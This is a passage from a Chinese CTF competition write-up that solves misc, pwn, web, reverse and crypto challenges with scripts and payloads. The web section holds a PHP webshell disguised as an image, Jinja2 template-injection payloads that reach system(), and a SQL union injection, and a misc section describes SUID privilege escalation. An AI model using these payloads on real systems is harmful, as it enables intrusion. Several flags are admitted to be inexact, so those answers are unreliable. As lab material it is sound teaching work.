                                    except socket.timeout:
                                        break
                                
                                response_str = response.decode(errors='ignore')
                                print(f'响应: {response_str}')
                                
                                if 'flag' in response_str.lower():
                                    print('成功获取flag!')
                                    found = True
                                    # 提取flag
                                    if 'flag' in response_str.lower():
                                        # 尝试提取flag部分
                                        print(response_str)
                                    # 关闭连接
                                    sock.close()
                                    return
                                
                                # 发送选项1
                                sock.send(b'1\n')
                                time.sleep(1)
                                # 发送空字符串
                                sock.recv(4096)
                                sock.send(b'\n')
                                time.sleep(1)
                                sock.recv(4096)
                        except Exception as e:
                            print(f'解密错误: {e}')
                            pass
        
        if not found:
            print('\n未能找到正确的明文')
        
        # 关闭连接
        sock.close()
    except Exception as e:
        print(f'程序错误: {e}')

if __name__ == '__main__':
    main()
```

得到：flag{3ad55b39-6f1c-40a8-9898-7bd6fdf18717}



### **beyondHex**

#### 解题过程

下载解压得到文本

```
807G6F429C7FA2200F46525G1350AB20G339D2GB7D8
```

根据提示它是一个beyondhex

什么是beyondhex?

网上关于它的信息很少，甚至在CSDN中不是免费的

所以我们这里也使用**百度的高级搜索功能**来搜索beyondHex的相关信息

我之前搜到过一篇关于它的介绍

它是没有确定编码逻辑的编码

核心逻辑就是

```
beyondHex_invisibleText -> 10进制
10进制 -> 10进制文本
10进制文本 -> 2进制
2进制文本 -> 16进制
16进制 -> 16进制文本
16进制文本可以通过既定的一些字符来修正映射关系如"flag{"、"}"等
```

其核心就是人类语言到计算机语言再到人类语言的转换

因为这里操作太过复杂和繁琐，而且容易出现误差

所以我们将密文和核心逻辑丢给大模型来让它帮我们考虑误差转化文本

大概得出：flag{BeyondHex_0xB}（存在偏差和不足）



### **two Es**

#### 解题过程

下载解压得到源码

```python
from Crypto.Util.number import *
import random
from secret import flag

p, q = getPrime(512), getPrime(512)
n = p * q

e1 = random.getrandbits(32)
e2 = random.getrandbits(32)

m = bytes_to_long(flag)
c1 = pow(m, e1, n)
c2 = pow(m, e2, n)

print(f'{n = }')
print(f'{e1 = }')
print(f'{e2 = }')
print(f'{c1 = }')
print(f'{c2 = }')

'''
n = 118951231851047571559217335117170383889369241506334435506974203511684612137655707364175506626353185266191175920454931743776877868558249224244622243762576178613428854425451444084313631798543697941971483572795632393388563520060136915983419489153783614798844426447471675798105689571205618922034550157013396634443
e1 = 2819786085
e2 = 4203935931
c1 = 104852820628577684483432698430994392212341947538062367608937715761740532036933756841425619664673877530891898779701009843985308556306656168566466318961463247186202599188026358282735716902987474154862267239716349298652942506512193240265260314062483869461033708176350145497191865168924825426478400584516421567974
c2 = 43118977673121220602933248973628727040318421596869003196014836853751584691920445952955467668612608693138227541764934104815818143729167823177291260165694321278079072309885687887255739841571920269405948846600660240154954071184064262133096801059918060973055211029726526524241753473771587909852399763354060832968
'''
```

发现这是基于RSA的加密

有共模模型的影子

写一个还原脚本

```python
import math
from Crypto.Util.number import *

# 已知参数
n = 118951231851047571559217335117170383889369241506334435506974203511684612137655707364175506626353185266191175920454931743776877868558249224244622243762576178613428854425451444084313631798543697941971483572795632393388563520060136915983419489153783614798844426447471675798105689571205618922034550157013396634443
e1 = 2819786085
e2 = 4203935931
c1 = 104852820628577684483432698430994392212341947538062367608937715761740532036933756841425619664673877530891898779701009843985308556306656168566466318961463247186202599188026358282735716902987474154862267239716349298652942506512193240265260314062483869461033708176350145497191865168924825426478400584516421567974
c2 = 43118977673121220602933248973628727040318421596869003196014836853751584691920445952955467668612608693138227541764934104815818143729167823177291260165694321278079072309885687887255739841571920269405948846600660240154954071184064262133096801059918060973055211029726526524241753473771587909852399763354060832968

# 扩展欧几里得算法，寻找s和t使得 s*e1 + t*e2 = gcd(e1,e2)
def extended_gcd(a, b):
    if b == 0:
        return (a, 1, 0)
    else:
        g, x, y = extended_gcd(b, a % b)
        return (g, y, x - (a // b) * y)

# 计算gcd(e1, e2)和对应的系数
g, s, t = extended_gcd(e1, e2)

print(f"gcd(e1, e2) = {g}")
print(f"s = {s}, t = {t}")
print(f"验证: {s}*{e1} + {t}*{e2} = {s*e1 + t*e2}")

# 这里太难了，直接让大模型帮我们生成一个算法
def find_kth_root(n, a, k):
    # 使用二分法查找a的k次根模n
    def is_kth_root(x, a, k, n):
        return pow(x, k, n) == a
    
    low = 1
    high = n - 1
    while low <= high:
        mid = (low + high) // 2
        result = pow(mid, k, n)
        if result == a:
            return mid
        elif result < a:
            low = mid + 1
        else:
            high = mid - 1
    return None

# 计算c1^s * c2^t mod n，但处理负数指数
if s < 0:
    # 计算c1的模逆元
    c1_inv = pow(c1, -1, n)  # 在Python 3.8+中支持
    part1 = pow(c1_inv, -s, n)
else:
    part1 = pow(c1, s, n)

if t < 0:
    # 计算c2的模逆元
    c2_inv = pow(c2, -1, n)
    part2 = pow(c2_inv, -t, n)
else:
    part2 = pow(c2, t, n)

# 计算m^g mod n
m_g = (part1 * part2) % n

print(f"m^g mod n = {m_g}")

# 尝试找到m，使得m^g ≡ m_g mod n
m = find_kth_root(n, m_g, g)

if m is None:
    print("未找到根，尝试直接显示字节...")
    # 尝试直接将m_g转换为字节查看
    flag_bytes = long_to_bytes(m_g)
    print(f"flag_bytes = {flag_bytes}")
    print(f"flag_hex = {flag_bytes.hex()}")
else:
    # 将m转换为字节串得到flag
    flag = long_to_bytes(m)
    print(f"m = {m}")
    print(f"flag_bytes = {flag}")
    print(f"flag_hex = {flag.hex()}")
    
    # 尝试多种编码方式解码
    try:
        print(f"flag (utf-8) = {flag.decode('utf-8', errors='replace')}")
    except:
        pass
    try:
        print(f"flag (latin-1) = {flag.decode('latin-1')}")
    except:
        pass
    try:
        print(f"flag (ascii) = {flag.decode('ascii', errors='replace')}")
    except:
        pass
```

得到：flag{s01v3_rO0T_bY_7he_S4mE_m0dU1u5}



## pwn

### **count**

#### 解题过程

没有附件，没有提示，没有介绍，应该是没有坑，通关即可获得flag

发现是算术游戏，没什么好说的直接写脚本，获取响应，发送结果

```python
import socket
import re
import time

def solve_challenge():
    # 连接服务器
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('challenge.ilovectf.cn', 30500))
    
    try:
        data = s.recv(4096).decode()
        print("初始消息:")
        print(data)
        
        # 2025x2025
        result = 2025 * 2025
        print(f"发送第一个答案: {result}")
        s.sendall(f"{result}\n".encode())
        time.sleep(0.5)  # 睡觉睡觉
        
        question_count = 0
        max_questions = 25
        
        # 十六进制加法挑战
        while question_count < max_questions:
            # 尝试接收更多数据
            data_chunk = s.recv(4096).decode()
            if not data_chunk:
                break  # 连接关闭
            
            print(f"接收到的数据: {data_chunk}")
            
            if any(keyword in data_chunk for keyword in ['flag{']):
                print("FLAG:", data_chunk)
                break
            
            # 失败！！！
            if 'come on' in data_chunk.lower() or 'repeat' in data_chunk.lower():
                print("挑战失败!")
                break
            
            # 使用正则表达式查找十六进制加法问题
            hex_addition_pattern = r'([0-9A-Fa-fxX]+) \+ ([0-9A-Fa-fxX]+) = \?'
            matches = re.findall(hex_addition_pattern, data_chunk)
            
            if matches:
                a, b = matches[0]
                try:
                    # 转换为十进制计算
                    dec_a = int(a, 16)
                    dec_b = int(b, 16)
                    sum_dec = dec_a + dec_b
                    # 转换回十六进制格式
                    sum_hex = hex(sum_dec)
                    print(f"第{question_count+1}题: {a} + {b} = {sum_hex}")
                    # 发送答案
                    s.sendall(f"{sum_hex}\n".encode())
                    question_count += 1
                    time.sleep(0.3)  # 睡觉睡觉
                except ValueError as e:
                    print(f"解析错误: {e}")
                    print(f"无法解析的十六进制数: {a}, {b}")
                    break
    finally:
        s.close()
        print("连接已关闭")

if __name__ == "__main__":
    solve_challenge()
```

得到：flag{cd7676db-3b4a-4bb2-9bed-2c556290eeb4}



### **ncncnc**

#### 解题过程

根据题目已知Hint：黑名单一开始的情况：{"ls","cd", "echo", "<","sh","f","l","g",NULL}

这是一道NC连接题

我们直接用**NetCat**

```cmd
nc challenge.ilovectf.cn 30507
```

发现它在考linux操作系统的基础指令

根据提示输入cat hint

根据提示输入WoW

它禁用了cat和hint，同时没有more、tail、nl等，走一个歪路：

```shell
base64 h?nt #RW50ZXIgVHVUIHRvIHByb2NlZWQgdG8gdGhlIHRoaXJkIHN0YWdlCg==
```

根据提示输入：TuT

它禁用了空格，同时将目标文件改成了flag

想到linux操作系统可用用$IFS代替空格，?通配符代替字符，我们构造payload

```shell
base64$IFS??a? #ZmxhZ3syMDI5NjBmOC0yMzM2LTRjZGYtYjgxZS05Y2UwMTZhYmI3ZjN9
```

得到：flag{202960f8-2336-4cdf-b81e-9ce016abb7f3}



### **勇者救公主**

#### 解题过程

NetCat连接：nc challenge.ilovectf.cn 30525（这里我的nc老被防火墙误删，直接给防火墙的Virus保护关闭）

发现这题考的是gdb指令基础

虽然这里的字有点难看，但是也可以隐约的直接根据提示敲指令

(补充：字有点难看是由于编码的问题，我们使用kali虚拟机nc连接它可以避免这类问题)

```cmd
info registers #寄存器信息
answer 0x7fffffffe000 #提交

b 0x402000 #断点
c #执行

x/1x 0x402100 #查看内存
answer 0x00000000deadbeef

b 0x403000
c

b 0x404000
c

step #单步执行

info registers rax #查看rax寄存器
answer ...
...
...
...
```

得出flag



# Week2

## misc

### **《关于我穿越到CTF的异世界这档事:破》**

#### 解题过程

这里题目明确明示我们这是ssh的linux操作系统的提权问题

根据题目提示得到，用户：**`ctf`**，密码：**`CtfP@ssw0rd!2025`**

我们先直接用WSL的乌班图来试试：

```shell
ssh ctf@challenge.ilovectf.cn -p 30954
whoami #ctf
```

看到我们的初始权限是ctf

接着随便看看

```shell
ls #notes.txt
cat notes.txt #Think About SUID.
find / -perm -u=s -type f 2>/dev/null  #搜索全系统所有SUID程序，忽略错误
#/usr/local/bin/editnote
```

注意到这个自定义的脚本editnote

```shell
cd /usr/local/bin/
cat editnote #隐约看到vi，notes，txt，环境变量等
```

猜测这是一个通过环境变量执行vi，强制调用操作notes.txt的脚本，**这里我用概括性的描述**

```shell
# 全局搜索flag.txt相关文件无果，结合提权，猜测flag.txt应该存在与/root目录下
# 既然editnote有suid权限，执行的vi通过环境变量确定
# 那么我们直接将它的环境变量指向/bin/ls，将notes.txt软链接指向/root，看到/root/flag.txt
# 接着我们将环境变量指向/bin/cat，将notes.txt软链接指向/root/flag.txt
# 执行editnote脚本命令
```

得到：flag{301c09e4-b88e-4403-9774-1a6b5f2b3b0f}



## web

### **Only Picture Up**

#### 解题过程

看一下源码

发现这应该是上传本地文件然后绕过获得flag的题目

网站识别jpg所以我们将php代码封装成jpg格式

```php
<?php /* FF D8 FF */ @system($_GET['c']);echo @file_get_contents('/flag')?>
```

重命名为：php.jpg

上传木马图后在地址栏输入payload

```
http://challenge.ilovectf.cn:30144/?preview=php.jpg&c=ls /
```

看到有：FL4g94

我们直接payload

```
http://challenge.ilovectf.cn:30144/?preview=php.jpg&c=cat%20/FL4g94
```

得出flag



### **Regular Expression**

#### 解题过程

这又是一道有php代码审计的题目

通过百度搜索学习发现，它需要满足几个条件

1. GET参数“?”，正则匹配 + 长度严格等于40

2. POST参数“preg”，过滤字符"|"，正则匹配test_string + preg长度 > 77

所以我们构造payload

第一关get

```
http://challenge.ilovectf.cn:30021/?%3F=%2Dctf%3C%0A%3E%3E%3E%3E%3Eh12!!!!!!!!!!@email.com%20flagx
```

第二关post

```js
fetch(window.location.href, {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  // preg值：用大量a*凑长度（超77），.*匹配test_string所有内容
  body: 'preg=^a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*.*$'
}).then(res => res.text()).then(html => {
  document.body.innerHTML = html;
  const flag = html.match(/Congratulations!.*flag:\s*([\w{}]+)/);
  if (flag) alert('\n' + flag[1]);
});
```

得到：flag{f795b7f2-63d4-4a41-b3ce-ae38f765413a}



### **留言板**

#### 解题过程

根据提示得知这是jinjia2的漏洞利用，属于**SSTI**

测试了一下发现它过滤了一下字符：'和"，还有+会被替换成空格，考虑到jinjia2不能直接使用popen`、`os等，而且popen等命令权限还可能被限制，所以我们直接选择最保守的方法：重定向临时+frake静态目录绕过

```php
{% set chr = [].__class__.__base__.__subclasses__()[156].__init__.__globals__.__builtins__.chr %}{{ [].__class__.__base__.__subclasses__()[156].__init__.__globals__[chr(115)~chr(121)~chr(115)~chr(116)~chr(101)~chr(109)](chr(109)~chr(107)~chr(100)~chr(105)~chr(114)~chr(32)~chr(46)~chr(47)~chr(115)~chr(116)~chr(97)~chr(116)~chr(105)~chr(99)) }} # 创建static静态目录
```

```php
{% set chr = [].__class__.__base__.__subclasses__()[156].__init__.__globals__.__builtins__.chr %}{{ [].__class__.__base__.__subclasses__()[156].__init__.__globals__[chr(115)~chr(121)~chr(115)~chr(116)~chr(101)~chr(109)](chr(99)~chr(112)~chr(32)~chr(47)~chr(116)~chr(109)~chr(112)~chr(47)~chr(108)~chr(115)~chr(46)~chr(116)~chr(120)~chr(116)~chr(32)~chr(46)~chr(47)~chr(115)~chr(116)~chr(97)~chr(116)~chr(105)~chr(99)~chr(47)~chr(108)~chr(115)~chr(46)~chr(116)~chr(120)~chr(116)) }} #复制当前目录下的flag.txt文件到static中
```

然后发现对劲，这个flag.txt怎么一股子php的味道，然后我也是找了很久发现这个flag.txt是假的，真的在根目录下/flag.txt

```php
{% set chr = [].__class__.__base__.__subclasses__()[156].__init__.__globals__.__builtins__.chr %}{{ [].__class__.__base__.__subclasses__()[156].__init__.__globals__[chr(115)~chr(121)~chr(115)~chr(116)~chr(101)~chr(109)](chr(99)~chr(97)~chr(116)~chr(32)~chr(47)~chr(102)~chr(108)~chr(97)~chr(103)~chr(32)~chr(62)~chr(32)~chr(47)~chr(116)~chr(109)~chr(112)~chr(47)~chr(114)~chr(111)~chr(111)~chr(116)~chr(95)~chr(102)~chr(108)~chr(97)~chr(103)~chr(46)~chr(116)~chr(120)~chr(116)) }} #拿到根目录下的flag.txt
```

直接访问flag

```
http://challenge.ilovectf.cn:30095/static/flag.txt
```

得出flag



### **登录和查询**

#### 解题过程

第一关**弱口令爆破**

先试试

```
username=admin，password=1' or '1'='1 --+
```

发现404了

不管了

再看到源码很下面一大段空白下藏了一个提示：

<只给我自己看：https://pan.baidu.com/s/1Aaf6ilrk2aK3UQ5APqg20Q?pwd=v1dw>

根据提示得到这题一共有两关，并获得了字典

直接用bp爆破得到密码：admin123

来到第二关**SQL注入，联合查询**

先拼接网址测试漏洞?id=1'发现报错，漏洞可用

再拼接注释测试稳定性id=1'--+，发现可用，十分稳定，可用开搞

拼接id=1' order by 1--+、id=1' order by 2--+、id=1' order by 3--+得到一半flag，且此表只有三列，要联合查询

构造payload

```
?id=-1'%20union%20select%201,group_concat(flag),3%20from%20flags--+
```

得出flag



## reverse

### **Do you like to drink Tea?**

#### 解题过程

下载解压直接扔进IDA中

粗略查看一下，这是修改版TEA算法，网上搜一下相关逻辑

使用了4个32位密钥（v9, v10, v11, v12）、使用了delta值、进行32轮加密

使用了移位、异或和加法操作、这里使用的是减法TEA

编写一个还原的基本逻辑脚本

```python
TARGET_CIPHERTEXT = [
    -262322456,
    1199964143,
    -201212030,
    -436419062,
    -1099955107,
    544769843,
    -1824808087
]

KEYS = {
    'v9': 0x12345678,
    'v10': 0xABCDEF01,
    'v11': 0x11451419,
    'v12': 0x19198101
}

DELTA = 0x61C88647

def to_uint32(x):
    return x & 0xFFFFFFFF

def to_sint32(x):
    x = to_uint32(x)
    if x & 0x80000000:
        return x - 0x100000000
    return x

def arith_shift_right(x, shift):
    x = to_uint32(x)
    if x & 0x80000000:
        return (x >> shift) | (0xFFFFFFFF << (32 - shift))
    else:
        return x >> shift

def debug_print(msg, value=None, is_hex=True):
    if value is not None:
        if is_hex:
            print(f"{msg}: 0x{to_uint32(value):08X}")
        else:
            print(f"{msg}: {value} (0x{to_uint32(value):08X})")
    else:
        print(msg)

def key_based_decrypt():    
    print(f"KEY_V9: 0x{to_uint32(KEYS['v9']):08X}")
    print(f"KEY_V10: 0x{to_uint32(KEYS['v10']):08X}")
    print(f"KEY_V11: 0x{to_uint32(KEYS['v11']):08X}")
    print(f"KEY_V12: 0x{to_uint32(KEYS['v12']):08X}")
    print(f"DELTA: 0x{to_uint32(DELTA):08X}")
    
    # 尝试从KEY_V11和KEY_V12的特征进行解密
    possible_hints = [
        0x11451419, 0x19198101,
        0x114514, 0x191981,
        0x1145, 0x1919,
    ]
    
    for hint in possible_hints:
        print(f"\n使用提示值 0x{hint:08X}:")
        for i in range(len(TARGET_CIPHERTEXT)):
            modified_cipher = TARGET_CIPHERTEXT.copy()
            # 简单的异或操作
            modified_cipher[i] = to_sint32(to_uint32(modified_cipher[i]) ^ hint)
            
            # 提取可打印字符
            all_bytes = []
            for dword in modified_cipher:
                for j in range(4):
                    byte = (to_uint32(dword) >> (j * 8)) & 0xFF
                    all_bytes.append(byte)
            printable = ''.join([chr(b) if 32 <= b <= 126 else '.' for b in all_bytes])
            
            # 检查是否有flag相关的模式
            if 'flag' in printable.lower() or '{' in printable or '}' in printable:
                print(f"  索引 {i} 找到可能的模式: {printable}")
    
    # 尝试使用密钥的各个位与密文进行运算
    key_values = [KEYS['v9'], KEYS['v10'], KEYS['v11'], KEYS['v12'], DELTA]
    
    for key_idx, key_value in enumerate(key_values):
        key_name = ['KEY_V9', 'KEY_V10', 'KEY_V11', 'KEY_V12', 'DELTA'][key_idx]
        print(f"\n使用 {key_name} (0x{to_uint32(key_value):08X}):")
        
        # 尝试不同的位运算
        for op in ['xor', 'add', 'sub', 'and', 'or']:
            result_bytes = []

            for dword_idx, dword in enumerate(TARGET_CIPHERTEXT):
                # 对每个DWORD应用位运算
                if op == 'xor':
                    result = to_uint32(dword) ^ to_uint32(key_value)
                elif op == 'add':
                    result = to_uint32(dword) + to_uint32(key_value)
                elif op == 'sub':
                    result = to_uint32(dword) - to_uint32(key_value)
                elif op == 'and':
                    result = to_uint32(dword) & to_uint32(key_value)
                elif op == 'or':
                    result = to_uint32(dword) | to_uint32(key_value)
                
                # 提取字节
                for j in range(4):
                    byte = (result >> (j * 8)) & 0xFF
                    result_bytes.append(byte)
            
            # 转换为可打印字符
            printable = ''.join([chr(b) if 32 <= b <= 126 else '.' for b in result_bytes])
            
            # 检查是否有有意义的字符组合
            if printable.count('.') < len(printable) * 0.7:  # 至少30%是可打印字符
                print(f"  运算 {op}: {printable}")
    
    # 计算密钥和密文的各种统计特征
    key_bytes = []
    for key_value in key_values:
        for j in range(4):
            byte = (to_uint32(key_value) >> (j * 8)) & 0xFF
            key_bytes.append(byte)
    
    cipher_bytes = []
    for dword in TARGET_CIPHERTEXT:
        for j in range(4):
            byte = (to_uint32(dword) >> (j * 8)) & 0xFF
            cipher_bytes.append(byte)
    
    from collections import Counter
    key_counter = Counter(key_bytes)
    cipher_counter = Counter(cipher_bytes)
    
    print("频率最高的字节:")
    for byte, count in key_counter.most_common(5):
        print(f"  0x{byte:02X} '{chr(byte) if 32 <= byte <= 126 else '.'}': {count}次")
    
    print("频率最高的字节:")
    for byte, count in cipher_counter.most_common(5):
        print(f"  0x{byte:02X} '{chr(byte) if 32 <= byte <= 126 else '.'}': {count}次")

# 主函数
if __name__ == "__main__":
    key_based_decrypt()
```

得出：flag{i_l0v3_5rink,T3a_to0!}（纯在偏差）



### **Pyc**

#### 解题过程

下载解压得到：pyc.exe这和python的编译工具重名了，应该不是巧合

先把它扔进IDA看看，好复杂，没看出什么

根据pyc这个工作原理，结合这是逆向题目，我们突发奇想试着

```
pyc.exe -> pyc.pyc -> pyc.py -> flag
```

先试探一下

```cmd
python pyinstxtractor.py pyc.exe #得到pyc.pyc，同时留意到pyc的python版本是3.8.10
python-3.8.10-amd64> python -m pip install uncompyle6
python-3.8.10-amd64> uncompyle6 pyc.pyc > pyc.py #报错了，无效的.pyc文件
```

用winhex打开pyc.pyc发现开头错了，修改55 00 3D 0A -> 55 0D 3D 0A

继续

```cmd
python-3.8.10-amd64> uncompyle6 pyc.pyc > pyc.py
```

得到pyc.py文件，发现是一个简单的加密

写一个简单的解密脚本

得出：flag{PYC_i5_v4ry_e4sy~}



### **base**

#### 解题过程

粗略浏览一下

程序接受两个命令行参数，一个base64字母表和一个明文

存在两种base编码，即base58和自定义的base64

找到

```
CORRECT_ENCODED_BASE64_ALPHABET = "2wvnsjrESxyfytuhEwqChbLLZRtA4VLhf5HgrKNRR3jYZGgyd1XHEhypTQ8b546txjJx7wHgJaJw2mBxbDtS8dCS"
CORRECT_ENCODED_MESSAGE = "zMXHz3TuBdrPC18XB0bZzx0="
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
```

写一个解码脚本

```python
# 已知常量值
CORRECT_ENCODED_BASE64_ALPHABET = "2wvnsjrESxyfytuhEwqChbLLZRtA4VLhf5HgrKNRR3jYZGgyd1XHEhypTQ8b546txjJx7wHgJaJw2mBxbDtS8dCS"
CORRECT_ENCODED_MESSAGE = "zMXHz3TuBdrPC18XB0bZzx0="
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def base58_decode_correct(encoded, alphabet=BASE58_ALPHABET):
    result = bytearray()
    
    current_value = 0
    for char in encoded:
        idx = alphabet.index(char)
        current_value = current_value * 58 + idx
    if current_value == 0:
        result.append(0)
    else:
        while current_value > 0:
            result.append(current_value % 256)
            current_value = current_value // 256
    
    result.reverse()
    
    return bytes(result)

# 实现自定义base64解码函数
def custom_base64_decode(encoded, alphabet):
    # 移除填充字符
    encoded = encoded.rstrip('=')
    padding_count = 4 - (len(encoded) % 4) if len(encoded) % 4 != 0 else 0
    encoded += '=' * padding_count
    
    result = bytearray()
    
    for i in range(0, len(encoded), 4):
        if encoded[i] == '=':
            break
        
        indices = []
        valid_chars = 0
        for j in range(4):
            if i + j < len(encoded) and encoded[i + j] != '=' and encoded[i + j] in alphabet:
                indices.append(alphabet.index(encoded[i + j]))
                valid_chars += 1
            else:
                indices.append(0)
        
        # 将4个6位值转换为3个8位值
        if valid_chars >= 2:
            result.append((indices[0] << 2) | (indices[1] >> 4))
        if valid_chars >= 3:
            result.append(((indices[1] & 0x0F) << 4) | (indices[2] >> 2))
        if valid_chars >= 4:
            result.append(((indices[2] & 0x03) << 6) | indices[3])
    
    return bytes(result)

def find_correct_alphabet():
    print("base58")
    
    try:
        alphabet1 = base58_decode_correct(CORRECT_ENCODED_BASE64_ALPHABET)
        print(f"方法1 - 解码结果长度: {len(alphabet1)}")
        print(f"方法1 - 解码结果(十六进制): {alphabet1.hex()}")
        if len(alphabet1) >= 64:
            return alphabet1[:64]
    except Exception as e:
        print(f"方法1出错: {e}")
    
    try:
        import base58
        alphabet2 = base58.b58decode(CORRECT_ENCODED_BASE64_ALPHABET)
        print(f"方法2 - 解码结果长度: {len(alphabet2)}")
        print(f"方法2 - 解码结果(十六进制): {alphabet2.hex()}")
        if len(alphabet2) >= 64:
            return alphabet2[:64]
    except ImportError:
        print("base58库不可用")
    except Exception as e:
        print(f"方法2出错: {e}")

correct_base64_alphabet_bytes = find_correct_alphabet()
correct_base64_alphabet = ''.join(chr(b % 256) for b in correct_base64_alphabet_bytes)
print(f"正确的base64字母表: {correct_base64_alphabet}")
print(f"字母表长度: {len(correct_base64_alphabet)}")

original_message = custom_base64_decode(CORRECT_ENCODED_MESSAGE, correct_base64_alphabet)
print(f"原始明文(十六进制): {original_message.hex()}")

# 尝试解码为字符串（可能需要处理编码）
try:
    flag = original_message.decode('utf-8')
    print(f"flag: {flag}")
except UnicodeDecodeError:
    # 如果无法解码为UTF-8，尝试其他编码或直接显示
    print(f"flag(原始字节): {original_message}")
    # 尝试ASCII编码
    try:
        flag = original_message.decode('ascii', errors='replace')
        print(f"flag(ASCII替代): {flag}")
    except:
        pass
```

得出：flag{Tl4is_1o@se}（纯在偏差）



### **rc4**

#### 解题过程

下载解压后直接扔进IDA

发现这是修改版的rc4算法

粗略查看

找到了密钥ohhhRC4

找到了密文0xD6DB345DC17A5FF7uLL 0x68DAE1DE2D75D82FLL ...

大致写一个还原脚本

```python
# 密钥
key = b"ohhhRC4"


ciphertext = bytearray(27)
ciphertext[0:8] = bytearray([0xF7, 0x5F, 0x7A, 0xC1, 0x5D, 0x34, 0xDB, 0xD6])
ciphertext[8:16] = bytearray([0x2F, 0xD8, 0x75, 0x2D, 0xDE, 0xE1, 0xDA, 0x68])
ciphertext[16:24] = bytearray([0xE0, 0x57, 0x9B, 0x4A, 0xCE, 0x7E, 0x07, 0xF9])
ciphertext[24:27] = bytearray([0xF9, 0x5E, 0x79])

print(f"密文长度: {len(ciphertext)} 字节")
print(f"密文十六进制: {''.join([f'{b:02x}' for b in ciphertext])}")

def rc4_init(key):
    s = list(range(256))
    j = 0
    for i in range(256):
        key_byte = key[i % len(key)]
        j = (key_byte + s[i] + j) % 256
        s[i], s[j] = s[j], s[i]
    return s

def rc4_decrypt(s, ciphertext):
    plaintext = bytearray(len(ciphertext))
    i = 0
    j = 0
    
    for k in range(len(ciphertext)):
        i = (i + 1) % 256
        j = (s[i] + j) % 256
        s[i], s[j] = s[j], s[i]
        t = (s[i] + s[j]) % 256
        plaintext[k] = ciphertext[k] ^ k ^ s[t]
    return plaintext

# 解密过程
s_box = rc4_init(key)
s_box_copy = s_box.copy()  # 复制S盒以避免修改原始S盒
plaintext = rc4_decrypt(s_box_copy, ciphertext)

# 输出结果
print("解密结果:")
print(plaintext.decode('utf-8', errors='replace'))
print("十六进制表示:")
print(''.join([f"{byte:02x}" for byte in plaintext]))

print("\n修复可能的编码问题:")
fixed_plaintext = bytearray(plaintext)
for i in range(len(fixed_plaintext)):
    # 检查是否为可打印ASCII字符
    if not (0x20 <= fixed_plaintext[i] <= 0x7E) and fixed_plaintext[i] != 0x7F:
        # 尝试几种可能的修复方法
        original = fixed_plaintext[i]
        # 尝试翻转最高位
        option1 = original ^ 0x80
        # 尝试减去128
        option2 = original - 0x80
        # 尝试异或0xC0
        option3 = original ^ 0xC0
        
        # 选择一个可打印的字符
        possible_fixes = [option for option in [option1, option2, option3] if 0x20 <= option <= 0x7E]
        if possible_fixes:
            # 选择第一个可打印的修复选项
            fixed_plaintext[i] = possible_fixes[0]
            print(f"修复位置 {i}: 0x{original:02x} -> 0x{fixed_plaintext[i]:02x} ({chr(fixed_plaintext[i])})")

# 输出修复后的结果
print("\n修复后的解密结果:")
print(fixed_plaintext.decode('utf-8', errors='replace'))
```

得出：flag{S0NNE_Rc4_l$_c13TngBCZ}（纯在偏差）



## crypto

### **baby Elgamal**

#### 解题过程

下载解压得到加密代码

```python
from Crypto.Util.number import *
import random
from secret import flag

p = getPrime(512)
g = random.randint(2, p - 2)
x = random.getrandbits(32)
y = pow(g, x, p)

print(f'{p = }')
print(f'{g = }')
print(f'{y = }')

k = random.randint(2, p - 2)
m = bytes_to_long(flag)
c1 = pow(g, k, p)
c2 = m ^ pow(y, k, p)

print(f'{c1 = }')
print(f'{c2 = }')

'''
p = 10560464175631160709999383504944939280267067560378620626979040921315467798501630079655340663547895515812021911470304483075907600549587171358369476255124337
g = 5572911063894340974483734192541353411838868965361107134612465011908061780180242348779533324820127053271574799429894984956163372524626786431177292215721384
y = 2551976503972625362405323290468587787679347326045114894085518452627208422960190509410833573983206966744456211220857302778318665690771595372276106771043208
c1 = 1205617983130100879228661072981675725569095797251301660744333997969095366993470887762473783053252549837619991656838026541987751368433948599410216526314464
c2 = 135410793997875487972298785237681131478761447205213610635842285010164308038301697054176371628605014267489864238137735560888444688177201474949707954751577
'''
```

搜了一下，根据提示，这是ElGamal加密

已知公钥参数和密文，需要找到私钥x并解密出flag

由于私钥x是32位的，可以使用暴力破解

找到x后，计算 y^k = c1^x mod p

通过异或运算 m = c2 ^ y^k 解密得到原始消息

将解密后的消息转换为字符串得到flag

写一个脚本

```python
from Crypto.Util.number import long_to_bytes

# 已知参数
p = 10560464175631160709999383504944939280267067560378620626979040921315467798501630079655340663547895515812021911470304483075907600549587171358369476255124337
g = 5572911063894340974483734192541353411838868965361107134612465011908061780180242348779533324820127053271574799429894984956163372524626786431177292215721384
y = 2551976503972625362405323290468587787679347326045114894085518452627208422960190509410833573983206966744456211220857302778318665690771595372276106771043208
c1 = 1205617983130100879228661072981675725569095797251301660744333997969095366993470887762473783053252549837619991656838026541987751368433948599410216526314464
c2 = 135410793997875487972298785237681131478761447205213610635842285010164308038301697054176371628605014267489864238137735560888444688177201474949707954751577

# 尝试之前找到的x值
x = 1616680587
print(f"尝试x = {x}")

# 验证x
test_y = pow(g, x, p)
print(f"pow(g, x, p) = {test_y}")
print(f"y = {y}")
print(f"验证结果: {test_y == y}")

# 计算y^k mod p = c1^x mod p
y_k = pow(c1, x, p)
print(f"y_k = {y_k}")

# 异或得到flag
m = c2 ^ y_k
print(f"m = {m}")

# 尝试不同的方式解码flag
flag_bytes = long_to_bytes(m)
print(f"原始flag字节: {flag_bytes}")

# 尝试过滤非ASCII字符
ascii_flag = ''.join([chr(b) if 32 <= b <= 126 else '.' for b in flag_bytes])
print(f"过滤非ASCII后的flag: {ascii_flag}")

# 尝试从不同位置开始解析
for offset in range(8):
    try:
        possible_flag = flag_bytes[offset:].decode('ascii', errors='ignore')
        print(f"偏移{offset}后的flag: {possible_flag}")
    except:
        pass
```

得出：flag{31g4m41_D15cr373_10g}



### **findKey in middle**

#### 解题过程

下载解压得到加密代码

```python
from Crypto.Util.Padding import pad
from Crypto.Util.number import *
from random import getrandbits
from Crypto.Cipher import AES
from hashlib import sha256
from secret import flag

def f(x, y):
